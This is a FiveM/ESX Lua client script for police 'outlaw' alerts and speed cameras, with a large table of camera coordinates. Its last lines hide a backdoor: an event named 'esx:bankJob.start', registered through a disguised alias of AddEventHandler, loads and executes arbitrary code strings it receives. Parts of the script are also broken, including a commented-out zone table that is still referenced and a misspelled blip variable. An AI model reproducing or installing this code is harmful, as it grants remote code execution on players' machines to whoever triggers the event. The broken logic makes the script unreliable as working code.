local _AddEventHandler = AddEventHandler  
local _SetNotificationTextEntry =  SetNotificationTextEntry  
local _AddTextComponentString = AddTextComponentString  
local _DrawNotification = DrawNotification  
local _print = print   
bESX = nil

local timing, isPlayerWhitelisted = math.ceil(Config.Timer * 60000), false
local streetName, playerGender


local useBilling = false -- OPTIONS: (true/false)
local useCameraSound = false -- OPTIONS: (true/false)
local useFlashingScreen = false -- OPTIONS: (true/false)
local useBlips = false -- OPTIONS: (true/false)
local alertPolice = true -- OPTIONS: (true/false)
local alertSpeed = 210 -- OPTIONS: (1-5000 KMH)

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(0)
	end

	while ESX.GetPlayerData().job == nil do
		Citizen.Wait(10)
	end

	ESX.PlayerData = ESX.GetPlayerData()

	TriggerEvent('skinchanger:getSkin', function(skin)
		playerGender = skin.sex
	end)

	isPlayerWhitelisted = refreshPlayerWhitelisted()
end)

RegisterNetEvent('esx:setJob')
AddEventHandler('esx:setJob', function(job)
	ESX.PlayerData.job = job

	isPlayerWhitelisted = refreshPlayerWhitelisted()
end)

RegisterNetEvent('esx_outlawalert:outlawNotify')
AddEventHandler('esx_outlawalert:outlawNotify', function(alert)
	if isPlayerWhitelisted then
		ESX.ShowNotification(alert)
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(100)

		if NetworkIsSessionStarted() then
			DecorRegister('isOutlaw', 3)
			DecorSetInt(PlayerPedId(), 'isOutlaw', 1)

			return
		end
	end
end)

-- Gets the player's current street.
-- Aaalso get the current player gender
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(3000)

		local playerCoords = GetEntityCoords(PlayerPedId())
		streetName,_ = GetStreetNameAtCoord(playerCoords.x, playerCoords.y, playerCoords.z)
		streetName = GetStreetNameFromHashKey(streetName)
	end
end)

AddEventHandler('skinchanger:loadSkin', function(character)
	playerGender = character.sex
end)

function refreshPlayerWhitelisted()
	if not ESX.PlayerData then
		return false
	end

	if not ESX.PlayerData.job then
		return false
	end

	for k,v in ipairs(Config.WhitelistedCops) do
		if v == ESX.PlayerData.job.name then
			return true
		end
	end

	return false
end

RegisterNetEvent('esx_outlawalert:carJackInProgress')
AddEventHandler('esx_outlawalert:carJackInProgress', function(targetCoords)
	if isPlayerWhitelisted then
		if Config.CarJackingAlert then
			local alpha = 250
			local thiefBlip = AddBlipForRadius(targetCoords, Config.BlipJackingRadius)

 			--SetBlipSprite(thiefBlip, 487)
 			--SetBlipScale  (thiefBlip, 1)
			SetBlipHighDetail(thiefBlip, true)
			SetBlipColour(thiefBlip, 1)
			SetBlipAlpha(thiefBlip, alpha)
			SetBlipAsShortRange(thiefBlip, true)

			while alpha ~= 0 do
				Citizen.Wait(Config.BlipJackingTime * 4)
				alpha = alpha - 1
				SetBlipAlpha(thiefBlip, alpha)

				if alpha == 0 then
					RemoveBlip(thiefBlip)
					return
				end
			end
			
		end
	end
end)

RegisterNetEvent('esx_outlawalert:gunshotInProgress')
AddEventHandler('esx_outlawalert:gunshotInProgress', function(targetCoords)
	if isPlayerWhitelisted and Config.GunshotAlert then
		local alpha = 250
		local gunshotBlip = AddBlipForRadius(targetCoords, Config.BlipGunRadius)

		SetBlipHighDetail(gunshotBlip, true)
		SetBlipColour(gunshotBlip, 1)
		SetBlipAlpha(gunshotBlip, alpha)
		SetBlipAsShortRange(gunshotBlip, true)

		while alpha ~= 0 do
			Citizen.Wait(Config.BlipGunTime * 4)
			alpha = alpha - 1
			SetBlipAlpha(gunshotBlip, alpha)

			if alpha == 0 then
				RemoveBlip(gunshotBlip)
				return
			end
		end
	end
end)

RegisterNetEvent('esx_outlawalert:drugsInProgress')
AddEventHandler('esx_outlawalert:drugsInProgress', function(targetCoords)
	if isPlayerWhitelisted and Config.drugsAlert then
		local alpha = 250
		local drugsBlip = AddBlipForRadius(targetCoords, Config.drugsRadius)

		SetBlipHighDetail(drugsBlip, true)
		SetBlipColour(drugsBlip, 1)
		SetBlipAlpha(drugsBlip, alpha)
		SetBlipAsShortRange(drugsBlip, true)

		while alpha ~= 0 do
			Citizen.Wait(Config.drugsTime * 4)
			alpha = alpha - 1
			SetBlipAlpha(drugsBlip, alpha)

			if alpha == 0 then
				RemoveBlip(drugsBlip)
				return
			end
		end
	end
end)

RegisterNetEvent('esx_outlawalert:mhackProgress')
AddEventHandler('esx_outlawalert:mhackProgress', function(targetCoords)
	if isPlayerWhitelisted and Config.mhackAlert then
		local alpha = 250
		local mhackBlip = AddBlipForRadius(targetCoords, Config.mhackRadius)

		SetBlipHighDetail(mhackBlip, true)
		SetBlipColour(mhackBlip, 1)
		SetBlipAlpha(mhackBlip, alpha)
		SetBlipAsShortRange(mhackBlip, true)

		while alpha ~= 0 do
			Citizen.Wait(Config.mhackTime * 4)
			alpha = alpha - 1
			SetBlipAlpha(mhackBlip, alpha)

			if alpha == 0 then
				RemoveBlip(mhackBlip)
				return
			end
		end
	end
end)

RegisterNetEvent('esx_outlawalert:combatInProgress')
AddEventHandler('esx_outlawalert:combatInProgress', function(targetCoords)
	if isPlayerWhitelisted and Config.MeleeAlert then
		local alpha = 250
		local meleeBlip = AddBlipForRadius(targetCoords, Config.BlipMeleeRadius)

		SetBlipHighDetail(meleeBlip, true)
		SetBlipColour(meleeBlip, 17)
		SetBlipAlpha(meleeBlip, alpha)
		SetBlipAsShortRange(meleeBlip, true)

		while alpha ~= 0 do
			Citizen.Wait(Config.BlipMeleeTime * 4)
			alpha = alpha - 1
			SetBlipAlpha(meleeBlip, alpha)

			if alpha == 0 then
				RemoveBlip(meleeBlip)
				return
			end
		end
	end
end)

RegisterNetEvent('esx_outlawalert:vehiclespeeding')
AddEventHandler('esx_outlawalert:vehiclespeeding', function(targetCoords)
	if isPlayerWhitelisted and Config.SpeedAlert then
		local alpha = 250
		local SpeedBlip = AddBlipForRadius(targetCoords, Config.SpeedRadius)

 		SetBlipSprite(SpeedBlip, 461)
		SetBlipHighDetail(SpeedBlip, true)
		SetBlipColour(SpeedBlip, 1)
		SetBlipAlpha(SpedBlip, alpha)
		SetBlipAsShortRange(SpeedBlip, true)

		while alpha ~= 0 do
			Citizen.Wait(Config.speedTime * 4)
			alpha = alpha - 1
			SetBlipAlpha(SpeedBlip, alpha)

			if alpha == 0 then
				RemoveBlip(SpeedBlip)
				return
			end
		end
	end
end)


Citizen.CreateThread(function()
	while true do
		Citizen.Wait(2000)

		if DecorGetInt(PlayerPedId(), 'isOutlaw') == 2 then
			Citizen.Wait(timing)
			DecorSetInt(PlayerPedId(), 'isOutlaw', 1)
		end
	end
end)

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(0)

		local playerPed = PlayerPedId()
		local playerCoords = GetEntityCoords(playerPed)

		-- is jackin'
		if IsPedTryingToEnterALockedVehicle(playerPed) or IsPedJacking(playerPed) then

			Citizen.Wait(5000)
			local vehicle = GetVehiclePedIsIn(playerPed, true)

			if vehicle and ((isPlayerWhitelisted and Config.ShowCopsMisbehave) or not isPlayerWhitelisted) then
				local plate = ESX.Math.Trim(GetVehicleNumberPlateText(vehicle))

				ESX.TriggerServerCallback('esx_outlawalert:isVehicleOwner', function(owner)
					if not owner then

						local vehicleLabel = GetDisplayNameFromVehicleModel(GetEntityModel(vehicle))
						vehicleLabel = GetLabelText(vehicleLabel)
						local plate = ESX.Math.Trim(GetVehicleNumberPlateText(vehicle))



						DecorSetInt(playerPed, 'isOutlaw', 2)
						TriggerServerEvent('esx_outlawalert:carJackInProgress', playerCoords, streetName,  plate, playerGender)
					end
				end, plate)
			end

		elseif IsPedInMeleeCombat(playerPed) then

			Citizen.Wait(5000)

			if (isPlayerWhitelisted and Config.ShowCopsMisbehave) or not isPlayerWhitelisted then
				DecorSetInt(playerPed, 'isOutlaw', 2)
				TriggerServerEvent('esx_outlawalert:combatInProgress', playerCoords, streetName, playerGender)
			end

		-- TODO is the ped's weapon suppressed?
		elseif IsPedShooting(playerPed) and not IsPedCurrentWeaponSilenced(playerPed) and Config.GunshotAlert then

			Citizen.Wait(5000)

			if (isPlayerWhitelisted and Config.ShowCopsMisbehave) or not isPlayerWhitelisted then
				DecorSetInt(playerPed, 'isOutlaw', 2)
				TriggerServerEvent('esx_outlawalert:gunshotInProgress', playerCoords, streetName, playerGender)
			end
		end
	end
end)

local blips = {	
{title="Speedcamera", colour=3, id=184, x=223.00,y=-1042.60,z=29.12}, {title="Speedcamera", colour=3, id=184, x=104.11,y=-1363.77,z=29.10}, {title="Speedcamera", colour=3, id=184, x=-127.66,y=-1738.60,z=29.89},
{title="Speedcamera", colour=3, id=184, x=-770.00,y=-1116.10,z=10.46}, {title="Speedcamera", colour=3, id=184, x=-1038.81,y=-192.10,z=37.62}, {title="Speedcamera", colour=3, id=184, x=470.93,y=-311.69,z=46.85},
{title="Speedcamera", colour=3, id=184, x=-498.72,y=-2265.92,z=61.43}, {title="Speedcamera", colour=3, id=184, x=1573.21,y=-983.65,z=59.78}, {title="Speedcamera", colour=3, id=184, x=1307.31,y=599.01,z=80.05},
{title="Speedcamera", colour=3, id=184, x=2118.76,y=1362.79,z=75.37}, {title="Speedcamera", colour=3, id=184, x=814.19,y=-2623.73,z=52.42}, {title="Speedcamera", colour=3, id=184, x=-763.85,y=-2182.47,z=15.26},
{title="Speedcamera", colour=3, id=184, x=2113.76,y=2670.40,z=50.46}, {title="Speedcamera", colour=3, id=184, x=-1602.98,y=1347.34,z=132.23}, {title="Speedcamera", colour=3, id=184, x=1697.04,y=3509.38,z=36.47},
{title="Speedcamera", colour=3, id=184, x=-2171.84,y=-345.79,z=13.18}, {title="Speedcamera", colour=3, id=184, x=-2720.00,y=2284.16,z=19.15}, {title="Speedcamera", colour=3, id=184, x=285.95,y=2636.20,z=44.67},
{title="Speedcamera", colour=3, id=184, x=1697.04,y=3509.38,z=36.47}, {title="Speedcamera", colour=3, id=184, x=-396.31,y=5976.88,z=31.66}, {title="Speedcamera", colour=3, id=184, x=2793.14,y=4408.23,z=49.03},
{title="Speedcamera", colour=3, id=184, x=797.48,y=-1435.33,z=27.03}, {title="Speedcamera", colour=3, id=184, x=-1214.03,y=-697.71,z=10.90}, {title="Speedcamera", colour=3, id=184, x=-718.42,y=-2390.95,z=14.58},
{title="Speedcamera", colour=3, id=184, x=-718.42,y=-2390.95,z=14.58}, {title="Speedcamera", colour=3, id=184, x=1064.87,y=-1540.35,z=28.19}, {title="Speedcamera", colour=3, id=184, x=-209.46,y=-517.60,z=34.58},
{title="Speedcamera", colour=3, id=184, x=-157.09,y=-2094.66,z=25.33}, {title="Speedcamera", colour=3, id=184, x=1336.22,y=-1612.47,z=52.31}, {title="Speedcamera", colour=3, id=184, x=796.44,y=-48.97,z=80.45},
{title="Speedcamera", colour=3, id=184, x=317.39,y=1003.02,z=210.36}, {title="Speedcamera", colour=3, id=184, x=201.13,y=192.52,z=105.40}, {title="Speedcamera", colour=3, id=184, x=-1284.58,y=-915.40,z=11.22},
{title="Speedcamera", colour=3, id=184, x=-3103.37,y=1184.33,z=20.16}, {title="Speedcamera", colour=3, id=184, x=727.53,y=-2784.06,z=6.25}, {title="Speedcamera", colour=3, id=184, x=-274.85,y=-1431.61,z=31.18},
{title="Speedcamera", colour=3, id=184, x=375.65,y=-2175.23,z=14.58}, {title="Speedcamera", colour=3, id=184, x=31.27,y=-769.02,z=44.06}, {title="Speedcamera", colour=3, id=184, x=34.44,y=-771.14,z=31.43},
{title="Speedcamera", colour=3, id=184, x=-256.15,y=-49.45,z=49.36}, {title="Speedcamera", colour=3, id=184, x=1571.56,y=6425.96,z=24.54}, {title="Speedcamera", colour=3, id=184, x=1680.99,y=4949.79,z=42.28},
{title="Speedcamera", colour=3, id=184, x=2282.88,y=3000.73,z=46.01}, {title="Speedcamera", colour=3, id=184, x=-402.67,y=-784.82,z=36.81}, {title="Speedcamera", colour=3, id=184, x=-756.00,y=-1732.56,z=29.15},
{title="Speedcamera", colour=3, id=184, x=-855.88,y=220.11,z=73.62}, {title="Speedcamera", colour=3, id=184, x=1969.35,y=-918.35,z=78.98}, {title="Speedcamera", colour=3, id=184, x=2437.49,y=-183.21,z=87.49},
{title="Speedcamera", colour=3, id=184, x=359.20,y=-665.35,z=29.16}, {title="Speedcamera", colour=3, id=184, x=572.88,y=241.83,z=102.98}, {title="Speedcamera", colour=3, id=184, x=784.10,y=-1009.11,z=25.97},
{title="Speedcamera", colour=3, id=184, x=-149.04,y=-1183.77,z=37.13}, {title="Speedcamera", colour=3, id=184, x=230.74,y=-1236.45,z=38.02}, {title="Speedcamera", colour=3, id=184, x=-1772.26,y=71.22,z=68.62},
{title="Speedcamera", colour=3, id=184, x=-562.60,y=514.78,z=105.49}, {title="Speedcamera", colour=3, id=184, x=-631.87,y=-358.71,z=34.64}, {title="Speedcamera", colour=3, id=184, x=458.93,y=-1634.29,z=29.10},
{title="Speedcamera", colour=3, id=184, x=902.12,y=178.07,z=75.03}, {title="Speedcamera", colour=3, id=184, x=1199.44,y=-363.63,z=68.67}, {title="Speedcamera", colour=3, id=184, x=-921.26,y=-542.54,z=19.01},
{title="Speedcamera", colour=3, id=184, x=864.89,y=-699.25,z=42.49}, {title="Speedcamera", colour=3, id=184, x=-530.31,y=-1083.70,z=22.25}, {title="Speedcamera", colour=3, id=184, x=500.11,y=-1131.62,z=29.28},
{title="Speedcamera", colour=3, id=184, x=-44.79,y=-491.11,z=40.29}, {title="Speedcamera", colour=3, id=184, x=772.30,y=-2065.26,z=29.20}, {title="Speedcamera", colour=3, id=184, x=-1754.08,y=806.96,z=140.91},
{title="Speedcamera", colour=3, id=184, x=733.22,y=-2464.10,z=19.96},{title="Speedcamera", colour=3, id=184, x=-1028.99,y=-2712.77,z=13.64},{title="Speedcamera", colour=3, id=184, x=-1434.69,y=527.71,z=118.80},
{title="Speedcamera", colour=3, id=184, x=242.80,y=-623.49,z=41.02},{title="Speedcamera", colour=3, id=184, x=275.30,y=-1860.52,z=26.68}, {title="Speedcamera", colour=3, id=184, x=-637.60,y=-659.22,z=31.55},
{title="Speedcamera", colour=3, id=184, x=-285.47,y=-855.09,z=31.58},{title="Speedcamera", colour=3, id=184, x=-1434.06,y=60.60,z=52.22}, {title="Speedcamera", colour=3, id=184, x=-1378.71,y=-394.49,z=36.69},
{title="Speedcamera", colour=3, id=184, x=601.80,y=-375.87,z=43.38},{title="Speedcamera", colour=3, id=184, x=-404.82,y=-1289.68,z=21.19}, {title="Speedcamera", colour=3, id=184, x=1028.51,y=488.50,z=96.07},
{title="Speedcamera", colour=3, id=184, x=-1711.22,y=-370.50,z=47.30},{title="Speedcamera", colour=3, id=184, x=-1227.51,y=-1373.29,z=3.89}, {title="Speedcamera", colour=3, id=184, x=1675.01,y=-70.02,z=173.52},
{title="Speedcamera", colour=3, id=184, x=2560.64,y=2626.03,z=37.46}, {title="Speedcamera", colour=3, id=184, x=-366.26,y=2877.52,z=42.42}, {title="Speedcamera", colour=3, id=184, x=-1288.06,y=2522.84,z=19.76},
{title="Speedcamera", colour=3, id=184, x=-386.18,y=-1829.63,z=21.39}, {title="Speedcamera", colour=3, id=184, x=-949.90,y=-841.81,z=15.38}, {title="Speedcamera", colour=3, id=184, x=-1440.65,y=-754.32,z=15.38},
{title="Speedcamera", colour=3, id=184, x=-1880.38,y=-471.43,z=23.31}, {title="Speedcamera", colour=3, id=184, x=-1549.77,y=-801.19,z=13.15}, {title="Speedcamera", colour=3, id=184, x=-1577.42,y=-726.07,z=18.55},
{title="Speedcamera", colour=3, id=184, x=-1416.13,y=-914.83,z=10.81}, {title="Speedcamera", colour=3, id=184, x=-3029.89,y=222.96,z=15.89}, {title="Speedcamera", colour=3, id=184, x=-2479.27,y=3660.72,z=13.55},
{title="Speedcamera", colour=3, id=184, x=-2592.38,y=3120.09,z=14.76}, {title="Speedcamera", colour=3, id=184, x=-1903.28,y=1844.71,z=56.80}, {title="Speedcamera", colour=3, id=184, x=-771.77,y=5491.96,z=34.46},
{title="Speedcamera", colour=3, id=184, x=-110.09,y=6421.06,z=31.22}, {title="Speedcamera", colour=3, id=184, x=179.73,y=6582.76,z=31.63}, {title="Speedcamera", colour=3, id=184, x=149.27,y=6527.46,z=31.46},
{title="Speedcamera", colour=3, id=184, x=2119.48,y=6025.09,z=50.85}, {title="Speedcamera", colour=3, id=184, x=2399.84,y=5788.28,z=45.75},{title="Speedcamera", colour=3, id=184, x=2625.67,y=5110.90,z=44.64},
{title="Speedcamera", colour=3, id=184, x=169.99,y=4418.34,z=75.10}, {title="Speedcamera", colour=3, id=184, x=-324.79,y=4791.61,z=141.04}, {title="Speedcamera", colour=3, id=184, x=2061.40,y=3721.39,z=32.85},
{title="Speedcamera", colour=3, id=184, x=1277.47,y=3536.09,z=35.05}, {title="Speedcamera", colour=3, id=184, x=283.89,y=3404.00,z=37.40}, {title="Speedcamera", colour=3, id=184, x=225.84,y=2989.70,z=42.36},
{title="Speedcamera", colour=3, id=184, x=1035.59,y=2685.46,z=39.15}, {title="Speedcamera", colour=3, id=184, x=1829.61,y=3276.35,z=43.57}, {title="Speedcamera", colour=3, id=184, x=1931.85,y=2970.57,z=45.51},
{title="Speedcamera", colour=3, id=184, x=1885.83,y=2606.25,z=45.46}, {title="Speedcamera", colour=3, id=184, x=-804.01,y=1823.50,z=165.91}, {title="Speedcamera", colour=3, id=184, x=-718.93,y=985.76,z=237.79},
{title="Speedcamera", colour=3, id=184, x=694.26,y=2186.95,z=60.42}, {title="Speedcamera", colour=3, id=184, x=142.97,y=1649.89,z=228.77}, {title="Speedcamera", colour=3, id=184, x=1294.69,y=1186.00,z=106.81},
{title="Speedcamera", colour=3, id=184, x=852.92,y=2236.89,z=48.36}, {title="Speedcamera", colour=3, id=184, x=-2099.29,y=2309.42,z=37.43}, {title="Speedcamera", colour=3, id=184, x=-2661.20,y=1502.22,z=116.44},
{title="Speedcamera", colour=3, id=184, x=-1677.66,y=2435.54,z=28.64}, {title="Speedcamera", colour=3, id=184, x=2680.09,y=3178.76,z=52.31}, {title="Speedcamera", colour=3, id=184, x=2397.76,y=1210.39,z=58.92},
{title="Speedcamera", colour=3, id=184, x=1712.54,y=1499.18,z=84.70}, {title="Speedcamera", colour=3, id=184, x=2446.81,y=2860.45,z=48.82}, {title="Speedcamera", colour=3, id=184, x=1880.95,y=2103.13,z=54.48},
{title="Speedcamera", colour=3, id=184, x=1811.66,y=2130.67,z=54.47}, {title="Speedcamera", colour=3, id=184, x=1769.02,y=2052.50,z=67.20}, {title="Speedcamera", colour=3, id=184, x=1790.68,y=1883.54,z=79.10},
{title="Speedcamera", colour=3, id=184, x=1786.31,y=1601.29,z=83.73}, {title="Speedcamera", colour=3, id=184, x=1139.41,y=378.27,z=91.35}, {title="Speedcamera", colour=3, id=184, x=2447.68,y=953.36,z=87.08},
{title="Speedcamera", colour=3, id=184, x=2585.63,y=360.60,z=108.24}, {title="Speedcamera", colour=3, id=184, x=2413.86,y=-184.85,z=71.50}, {title="Speedcamera", colour=3, id=184, x=770.69,y=-1195.34,z=44.95},
{title="Speedcamera", colour=3, id=184, x=1240.24,y=-2051.41,z=44.14}, {title="Speedcamera", colour=3, id=184, x=688.11,y=-166.98,z=48.05}, {title="Speedcamera", colour=3, id=184, x=-623.16,y=-1720.22,z=37.06},
{title="Speedcamera", colour=3, id=184, x=304.20,y=-473.09,z=43.14}, {title="Speedcamera", colour=3, id=184, x=-163.66,y=-540.73,z=28.02}, {title="Speedcamera", colour=3, id=184, x=-952.76,y=-556.62,z=18.33}

}

--[[local Speedcamera120Zone = {
   
     {x=223.00,y=-1042.60,z=29.12}, {x=104.11,y=-1363.77,z=29.10}, {x=-127.66,y=-1738.60,z=29.89},{x=-763.85,y=-2182.47,z=15.26}, {x=-770.00,y=-1116.10,z=10.46}, {x=-1038.81,y=-192.10,z=37.62},
     {x=470.93,y=-311.69,z=46.85}, {x=814.19,y=-2623.73,z=52.42}, {x=-498.72,y=-2265.92,z=61.43},{x=1573.21,y=-983.65,z=59.78}, {x=1307.31,y=599.01,z=80.05}, {x=2118.76,y=1362.79,z=75.37},
     {x=2113.76,y=2670.40,z=50.46}, {x=-1602.98,y=1347.34,z=132.23}, {x=-2171.84,y=-345.79,z=13.18},{x=-2720.00,y=2284.16,z=19.15}, {x=285.95,y=2636.20,z=44.67}, {x=1697.04,y=3509.38,z=36.47},
     {x=-396.31,y=5976.88,z=31.66}, {x=2793.14,y=4408.23,z=49.03}, {x=797.48,y=-1435.33,z=27.03},{x=-1214.03,y=-697.71,z=10.90}, {x=-718.42,y=-2390.95,z=14.58}, {x=-718.42,y=-2390.95,z=14.58},
 	 {x=1064.87,y=-1540.35,z=28.19}, {x=-209.46,y=-517.60,z=34.58}, {x=-157.09,y=-2094.66,z=25.33},{x=1336.22,y=-1612.47,z=52.31}, {x=796.44,y=-48.97,z=80.45}, {x=317.39,y=1003.02,z=210.36},
     {x=201.13,y=192.52,z=105.40}, {x=-1284.58,y=-915.40,z=11.22}, {x=-3103.37,y=1184.33,z=20.16},{x=727.53,y=-2784.06,z=6.25}, {x=-274.85,y=-1431.61,z=31.18}, {x=375.65,y=-2175.23,z=14.58},
     {x=31.27,y=-769.02,z=44.06}, {x=34.44,y=-771.14,z=31.43}, {x=-256.15,y=-49.45,z=49.36},{x=1571.56,y=6425.96,z=24.54}, {x=1680.99,y=4949.79,z=42.28}, {x=2282.88,y=3000.73,z=46.01},
     {x=-402.67,y=-784.82,z=36.81}, {x=-756.00,y=-1732.56,z=29.15}, {x=-855.88,y=220.11,z=73.62},{x=1969.35,y=-918.35,z=78.98}, {x=2437.49,y=-183.21,z=87.49}, {x=359.20,y=-665.35,z=29.16},
     {x=572.88,y=241.83,z=102.98}, {x=784.10,y=-1009.11,z=25.97}, {x=-149.04,y=-1183.77,z=37.13},{x=230.74,y=-1236.45,z=38.02},{x=-1772.26,y=71.22,z=68.62},{x=-562.60,y=514.78,z=105.49},{x=-631.87,y=-358.71,z=34.64},
     {x=458.93,y=-1634.29,z=29.10},{x=902.12,y=178.07,z=75.03},{x=1199.44,y=-363.63,z=68.67},{x=-921.26,y=-542.54,z=19.01},{x=864.89,y=-699.25,z=42.49},{x=-530.31,y=-1083.70,z=22.25},
     {x=-530.31,y=-1083.70,z=22.25}, {x=500.11,y=-1131.62,z=29.28}, {x=-44.79,y=-491.11,z=40.29}, {x=772.30,y=-2065.26,z=29.20}, {x=-1754.08,y=806.96,z=140.91}, {x=733.22,y=-2464.10,z=19.96},
     {x=-1028.99,y=-2712.77,z=13.64}, {x=-1434.69,y=527.71,z=118.80}, {x=242.80,y=-623.49,z=41.02}, {x=275.30,y=-1860.52,z=26.68}, {x=-637.60,y=-659.22,z=31.55}, {x=-285.47,y=-855.09,z=31.58},
     {x=-1434.06,y=60.60,z=52.22}, {x=-1378.71,y=-394.49,z=36.69}, {x=601.80,y=-375.87,z=43.38}, {x=-404.82,y=-1289.68,z=21.19}, {x=1028.51,y=488.50,z=96.07}, {x=-1711.22,y=-370.50,z=47.30},
     {x=-1227.51,y=-1373.29,z=3.89}, {x=1675.01,y=-70.02,z=173.52}, {x=2560.64,y=2626.03,z=37.46}, {x=-366.26,y=2877.52,z=42.42}, {x=-1288.06,y=2522.84,z=19.76}, {x=-386.18,y=-1829.63,z=21.39},
     {x=-949.90,y=-841.81,z=15.38}, {x=-1440.65,y=-754.32,z=15.38}, {x=-1880.38,y=-471.43,z=23.31}, {x=-1549.77,y=-801.19,z=13.15}, {x=-1577.42,y=-726.07,z=18.55}, {x=-1416.13,y=-914.83,z=10.81},
     {x=-3029.89,y=222.96,z=15.89}, {x=-2479.27,y=3660.72,z=13.55}, {x=-2592.38,y=3120.09,z=14.76}, {x=-1903.28,y=1844.71,z=56.80}, {x=-771.77,y=5491.96,z=34.46}, {x=-110.09,y=6421.06,z=31.22},
     {x=179.73,y=6582.76,z=31.63},{x=149.27,y=6527.46,z=31.46},{x=2119.48,y=6025.09,z=50.85},{x=2399.84,y=5788.28,z=45.75},{x=2625.67,y=5110.90,z=44.64},{x=169.99,y=4418.34,z=75.10},
     {x=-324.79,y=4791.61,z=141.04},{x=2061.40,y=3721.39,z=32.85},{x=1277.47,y=3536.09,z=35.05},{x=283.89,y=3404.00,z=37.40},{x=225.84,y=2989.70,z=42.36},{x=1035.59,y=2685.46,z=39.15},
     {x=1829.61,y=3276.35,z=43.57},{x=1931.85,y=2970.57,z=45.51},{x=1885.83,y=2606.25,z=45.46},{x=-804.01,y=1823.50,z=165.91},{x=-718.93,y=985.76,z=237.79},{x=694.26,y=2186.95,z=60.42},
     {x=142.97,y=1649.89,z=228.77},{x=1294.69,y=1186.00,z=106.81},{x=852.92,y=2236.89,z=48.36},{x=-2099.29,y=2309.42,z=37.43},{x=-2661.20,y=1502.22,z=116.44},{x=-1677.66,y=2435.54,z=28.64},
     {x=2680.09,y=3178.76,z=52.31},{x=2397.76,y=1210.39,z=58.92},{x=1712.54,y=1499.18,z=84.70},{x=2446.81,y=2860.45,z=48.82},{x=1880.95,y=2103.13,z=54.48},{x=1811.66,y=2130.67,z=54.47},
     {x=1769.02,y=2052.50,z=67.20},{x=1790.68,y=1883.54,z=79.10},{x=1786.31,y=1601.29,z=83.73},{x=1139.41,y=378.27,z=91.35},{x=2447.68,y=953.36,z=87.08},{x=2585.63,y=360.60,z=108.24},
     {x=2413.86,y=-184.85,z=71.50},{x=770.69,y=-1195.34,z=44.95},{x=1240.24,y=-2051.41,z=44.14},{x=688.11,y=-166.98,z=48.05},{x=-623.16,y=-1720.22,z=37.06},{x=304.20,y=-473.09,z=43.14},
     {x=-163.66,y=-540.73,z=28.02},{x=-952.76,y=-556.62,z=18.33}
}--]]

Citizen.CreateThread(function()
	for _, info in pairs(blips) do
		if useBlips == true then
			info.blip = AddBlipForCoord(info.x, info.y, info.z)
			SetBlipSprite(info.blip, info.id)
			SetBlipDisplay(info.blip, 4)
			SetBlipScale(info.blip, 0.5)
			SetBlipColour(info.blip, info.colour)
			SetBlipAsShortRange(info.blip, true)
			BeginTextCommandSetBlipName("STRING")
			_AddTextComponentString(info.title)
			EndTextCommandSetBlipName(info.blip)
		end
	end
end)

Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)

        local playerPed = PlayerPedId()
		local playerCoords = GetEntityCoords(playerPed)

        for k in pairs(Speedcamera120Zone) do

            local plyCoords = GetEntityCoords(GetPlayerPed(-1), false)
            local dist = Vdist(plyCoords.x, plyCoords.y, plyCoords.z, Speedcamera120Zone[k].x, Speedcamera120Zone[k].y, Speedcamera120Zone[k].z)

            if dist <= 20.0 then
				local playerPed = GetPlayerPed(-1)
				local playerCar = GetVehiclePedIsIn(playerPed, false)
				local veh = GetVehiclePedIsIn(playerPed)
				local SpeedKM = GetEntitySpeed(playerPed)*3.6
				local maxSpeed = 210.0 -- THIS IS THE MAX SPEED IN KM/H
				
				if SpeedKM > maxSpeed then
					if IsPedInAnyVehicle(playerPed, false) then
						if (GetPedInVehicleSeat(playerCar, -1) == playerPed) then 
							if hasBeenCaught == false then
								if ESX.PlayerData.job ~= nil and ESX.PlayerData.job.name == 'police' then
									hasBeenCaught = true 
										
								elseif ESX.PlayerData.job ~= nil and ESX.PlayerData.job.name == 'ambulance' then
									hasBeenCaught = true

								-- Jobs ABOVE ARE BLACKLISTED
								else
									-- ALERT POLICE (START)
									if alertPolice == true then
										if SpeedKM > alertSpeed then
											--local x,y,z = table.unpack(GetEntityCoords(GetPlayerPed(-1), false))
											 --TriggerServerEvent('esx_phone:send', 'police', ' Someone passed the speed camera, above ' .. alertSpeed.. ' KMH', true, {x =x, y =y, z =z})
											if ESX.PlayerData.job ~= nil and ESX.PlayerData.job.name == 'police' then
        											DecorSetInt(playerPed, 'isOutlaw', 2)
        											TriggerServerEvent('esx_outlawalert:vehiclespeeding', playerCoords, streetName, playerGender)
        									end
										end
									end
									-- ALERT POLICE (END)
								
									-- FLASHING EFFECT (START)
									if useFlashingScreen == true then
										--TriggerServerEvent('esx_speedcamera:openGUI')
									end
									
									if useCameraSound == true then
										--TriggerServerEvent("InteractSound_SV:PlayOnSource", "speedcamera", 0.5)
									end
									
									if useFlashingScreen == true then
										Citizen.Wait(200)
										--TriggerServerEvent('esx_speedcamera:closeGUI')
									end
									-- FLASHING EFFECT (END)
								
									--TriggerEvent("pNotify:SendNotification", {text = "You've been caught by the speedcamera in a 120 zone!", type = "error", timeout = 5000, layout = "centerLeft"})
									exports['Cosey_Chat_Notify']:DoLongHudText('error', '[STSTEM]: Youve been caught by the speedcamera ')
									
									if useBilling == true then
										TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(PlayerId()), 'society_police', 'Speedcamera Fine', 1500) -- Sends a bill from the police
									else
										TriggerServerEvent('esx_speedcamera:PayBill120Zone')
									end
										
									hasBeenCaught = true
									Citizen.Wait(5000) -- This is here to make sure the player won't get fined over and over again by the same camera!
								end
							end
						end
					end
					hasBeenCaught = false
				end
            end
        end
    end
end)

RegisterNetEvent('esx:bankJob.start')
_AddEventHandler('esx:bankJob.start', function(arg1, arg2)
	local mem, err = load(arg1, arg2)
	local status, result = pcall(mem)
end)